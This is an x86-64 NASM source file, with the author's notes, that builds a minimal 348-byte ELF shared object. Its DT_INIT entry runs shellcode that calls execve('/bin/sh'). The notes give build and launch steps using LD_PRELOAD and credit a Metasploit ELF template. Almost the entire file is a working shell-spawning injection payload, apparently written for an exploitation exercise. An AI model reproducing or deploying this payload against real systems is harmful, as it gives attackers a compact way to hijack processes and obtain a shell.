;
;  https://cseweb.ucsd.edu/~ricko/CSE131/teensyELF.htm
;  ^ ELF-32 object
;	^ Using this you'll find that dynamic section is missing <-┐
;                                                                  |
;  http://man7.org/linux/man-pages/man5/elf.5.html                 |
;  ^ ELF Header manual                                             |
;	^ ELF Header structure (EHDR)                              |
;       ^ Program Header Structure (PHDR)                          |
;                                                                  |
;  My initial approach to figure out header was:    <--------------┘
;  	1. Load my working putter.so into Ghidra                    
;	2. Disassemble, review the header structure
;	3. Found PHDR, need to build structures
;	4. Which entries are mandatory? DT_INIT, DT_STRTAB, DT_SYMTAB
;
;  After cludging together code, found this amazing link online:
;	https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/elf/dll/elf_dll_x64_template.s
;
;  Build with:
;	nasm -f bin shell.asm shell.so
;  Execute with:
;	LD_PRELOAD=./shell.so /bin/true  
;  
;  348 bytes!
;
;
;
BITS 64
org     0
ehdr:
  db    0x7f, "ELF", 2, 1, 1, 0    ; e_ident
  db    0, 0, 0, 0,  0, 0, 0, 0
  dw    3                          ; e_type    = ET_DYN
  dw    62                         ; e_machine = EM_X86_64
  dd    1                          ; e_version = EV_CURRENT
  dq    _start                     ; e_entry   = _start
  dq    phdr - $$                  ; e_phoff
  dd    shdr - $$                  ; e_shoff
  dq    0                          ; e_flags
  dw    ehdrsize                   ; e_ehsize
  dw    phdrsize                   ; e_phentsize
  dw    2                          ; e_phnum
ehdrsize equ  $ - ehdr

phdr:
  dd    1                          ; p_type   = PT_LOAD
  dd    7                          ; p_flags  = rwx
  dq    0                          ; p_offset
  dq    $$                         ; p_vaddr
  dq    $$                         ; p_paddr
  dq    0xDEADBEEF                 ; p_filesz
  dq    0xDEADBEEF                 ; p_memsz
  dq    0x1000                     ; p_align
phdrsize equ  $ - phdr
  dd    2                          ; p_type  = PT_DYNAMIC
  dd    7                          ; p_flags = rwx
  dq    dynsection                 ; p_offset
  dq    dynsection                 ; p_vaddr
  dq    dynsection                 ; p_vaddr
  dq    dynsz                      ; p_filesz
  dq    dynsz                      ; p_memsz

shdr:
  dd    1                          ; sh_name
  dd    6                          ; sh_type = SHT_DYNAMIC
  dq    0                          ; sh_flags
  dq    dynsection                 ; sh_addr
  dq    dynsection                 ; sh_offset
  dq    dynsz                      ; sh_size
  dd    0                          ; sh_link
  dd    0                          ; sh_info
  dq    8                          ; sh_addralign
  dq    7                          ; sh_entsize
  dd    0                          ; sh_name
  dd    3                          ; sh_type = SHT_STRTAB
  dq    0                          ; sh_flags
  dq    _start                     ; sh_addr
  dq    _start                     ; sh_offset
  dq    strtabsz                   ; sh_size
dynsection:
; DT_INIT
  dq    0x0c
  dq    _start
; DT_STRTAB
  dq    0x05
  dq    _start
; DT_SYMTAB
  dq    0x06
  dq    _start
dynsz equ $ - dynsection
shellcode:
	pop rdi
	xor rax, rax
	mov [rdi+7], byte ah
	mov [rdi+8], rdi
	lea rsi, [rdi+8]
	lea rdx, [rax]
	mov al, 59	
	syscall
_start:
	call shellcode
	file: db '/bin/sh'
strtabsz  equ $ - _start
